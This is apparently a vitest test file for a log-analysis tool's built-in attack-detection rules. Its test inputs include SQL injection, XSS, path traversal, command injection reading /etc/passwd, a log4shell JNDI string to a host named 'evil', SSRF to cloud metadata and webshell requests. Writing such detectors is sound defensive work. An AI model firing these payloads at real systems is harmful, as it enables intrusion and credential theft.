import { describe, expect, it } from "vitest";
import { BUILTIN_RULES, describeFilter, ruleFilter, ruleFromView } from "./rules";
import { emptyFilter, type FilterExpr } from "../types";

/** 조건식을 JS로 평가해 서명이 의도한 값을 잡는지 본다(엔진 SQL과 같은 의미). */
function evalExpr(e: FilterExpr, row: Record<string, string | number | null>): boolean {
  switch (e.kind) {
    case "true":
      return true;
    case "and":
      return e.items.every((i) => evalExpr(i, row));
    case "or":
      return e.items.some((i) => evalExpr(i, row));
    case "not":
      return !evalExpr(e.item, row);
    case "cond": {
      const v = row[e.field];
      if (e.op === "is_null") return v === null || v === undefined;
      if (v === null || v === undefined) return false;
      const s = String(v);
      const n = Number(v);
      switch (e.op) {
        case "eq":
          return s === e.value;
        case "ne":
          return s !== e.value;
        case "gt":
          return n > Number(e.value);
        case "gte":
          return n >= Number(e.value);
        case "lt":
          return n < Number(e.value);
        case "lte":
          return n <= Number(e.value);
        case "contains":
          return s.includes(e.value);
        case "icontains":
          return s.toLowerCase().includes(e.value.toLowerCase());
        case "starts_with":
          return s.startsWith(e.value);
        case "ends_with":
          return s.endsWith(e.value);
        case "regex":
          return new RegExp(e.value.replace(/^\(\?i\)/, ""), e.value.startsWith("(?i)") ? "i" : "").test(s);
      }
    }
  }
}
const byId = (id: string) => BUILTIN_RULES.find((r) => r.id === `builtin:${id}`)!;
const req = (request_target: string, status = 200, user_agent: string | null = "Mozilla/5.0") => ({ request_target, status, user_agent, client_ip: "1.1.1.1", method: "GET", bytes_sent: 10, protocol: "HTTP/1.1", referrer: null });

describe("builtin rules", () => {
  it("compile and carry names", () => {
    expect(BUILTIN_RULES.length).toBeGreaterThanOrEqual(18);
    expect(BUILTIN_RULES[0]).toMatchObject({ id: "builtin:bookmarks", builtin: true });
    expect(ruleFilter(BUILTIN_RULES[0], { active_only: true })).toMatchObject({ bookmarked_only: true, active_only: true });
    expect(BUILTIN_RULES[1]).toMatchObject({ id: "builtin:all_requests", name: "전체 요청", builtin: true });
    expect(ruleFilter(byId("server_errors"), { active_only: true })).toMatchObject({ active_only: true, expr: { kind: "cond", field: "status", op: "gte", value: "500" } });
  });

  it("signatures hit typical payloads and skip plain paths", () => {
    expect(evalExpr(byId("sql_injection").expr, req("/item?id=1%27%20UNION%20SELECT%201"))).toBe(true);
    expect(evalExpr(byId("sql_injection").expr, req("/item?id=1' or 1=1--"))).toBe(true);
    expect(evalExpr(byId("xss").expr, req("/s?q=<script>alert(1)</script>"))).toBe(true);
    expect(evalExpr(byId("path_traversal").expr, req("/../../etc/passwd"))).toBe(true);
    expect(evalExpr(byId("scanner_paths").expr, req("/wp-login.php"))).toBe(true);
    expect(evalExpr(byId("command_injection").expr, req("/ping?host=1.1.1.1;cat%20/etc/passwd"))).toBe(true);
    expect(evalExpr(byId("sql_injection_success").expr, req("/x?id=%27", 200))).toBe(true);
    expect(evalExpr(byId("sql_injection_success").expr, req("/x?id=%27", 404))).toBe(false);
    expect(evalExpr(byId("bots").expr, req("/", 200, "python-requests/2.31"))).toBe(true);
    expect(evalExpr(byId("bots").expr, req("/", 200, null))).toBe(true);
    const sqlmap = byId("sqlmap").expr;
    expect(evalExpr(sqlmap, req("/item.php?id=1%20AND%201234=1234"))).toBe(true);
    expect(evalExpr(sqlmap, req("/item.php?id=1' AND 7429=7429-- xKpq"))).toBe(true);
    expect(evalExpr(sqlmap, req("/item.php?id=-1%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(0x716b6a7671,IFNULL(CAST(user()%20AS%20NCHAR),0x20),0x7176767a71)--%20-"))).toBe(true);
    expect(evalExpr(sqlmap, req("/item.php?id=1%20AND%20EXTRACTVALUE(1234,CONCAT(0x5c,0x716b6a7671))"))).toBe(true);
    expect(evalExpr(sqlmap, req("/item.php?id=1%20AND%20(SELECT%201234%20FROM%20(SELECT(SLEEP(5)))x)"))).toBe(true);
    expect(evalExpr(sqlmap, req("/item.php?id=1;WAITFOR%20DELAY%20'0:0:5'--"))).toBe(true);
    expect(evalExpr(sqlmap, req("/item?id=1||CHR(113)||CHR(122)||CHR(118)"))).toBe(true);
    expect(evalExpr(sqlmap, req("/", 200, "sqlmap/1.7.2#stable (https://sqlmap.org)"))).toBe(true);
    expect(evalExpr(sqlmap, req("/item.php?id=1234&page=5678"))).toBe(false);
    expect(evalExpr(sqlmap, req("/search?q=and%20then%20some"))).toBe(false);
    expect(evalExpr(byId("log4shell").expr, req("/?x=${jndi:ldap://evil/a}"))).toBe(true);
    expect(evalExpr(byId("log4shell").expr, req("/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D"))).toBe(true);
    expect(evalExpr(byId("lfi_ssrf").expr, req("/page?file=php://filter/convert.base64-encode/resource=index"))).toBe(true);
    expect(evalExpr(byId("lfi_ssrf").expr, req("/fetch?url=http://169.254.169.254/latest/meta-data/"))).toBe(true);
    expect(evalExpr(byId("webshell_upload").expr, req("/uploads/2026/shell.php?cmd=id"))).toBe(true);
    expect(evalExpr(byId("unusual_methods").expr, { ...req("/"), method: "PROPFIND" })).toBe(true);
    expect(evalExpr(byId("unusual_methods").expr, req("/"))).toBe(false);
    expect(evalExpr(byId("large_responses").expr, { ...req("/big.zip"), bytes_sent: 50 * 1024 * 1024 })).toBe(true);
    expect(evalExpr(byId("scanner_tools").expr, req("/", 200, "Mozilla/5.0 (Nikto/2.1.6)"))).toBe(true);
    for (const r of BUILTIN_RULES.filter((x) => !["bookmarks", "all_requests", "ok_responses"].some((id) => x.id === `builtin:${id}`))) {
      expect(evalExpr(r.expr, req("/index.html")), r.id).toBe(false);
      expect(evalExpr(r.expr, req("/api/users/42?page=2&sort=name")), r.id).toBe(false);
    }
  });
});

describe("ruleFromView", () => {
  it("re-parses stored source and falls back for legacy views", () => {
    const src = 'rule mine { meta: description = "설명" condition: status == 404 }';
    const r = ruleFromView({ view_id: 7, name: "내 룰", definition: { filter: { ...emptyFilter(), status: 404 }, sort: "time_desc", columns: [], rule_source: src } });
    expect(r).toMatchObject({ id: "view:7", builtin: false, viewId: 7, name: "내 룰", description: "설명", source: src });
    expect(ruleFilter(r).expr).toEqual({ kind: "cond", field: "status", op: "eq", value: "404" });

    const broken = ruleFromView({ view_id: 8, name: "깨짐", definition: { filter: { ...emptyFilter(), status: 500 }, sort: "time_desc", columns: [], rule_source: "rule x { condition: nope }" } });
    expect(broken.error).toBeTruthy();
    expect(ruleFilter(broken).status).toBe(500);

    const legacy = ruleFromView({ view_id: 9, name: "옛 뷰", definition: { filter: { ...emptyFilter(), status: 404, target_contains: "/admin" }, sort: "time_desc", columns: [], rule_source: null } });
    expect(legacy.description).toBe('상태 404 · 경로에 "/admin" 포함');
    expect(describeFilter(emptyFilter())).toBe("조건 없음");
  });
});
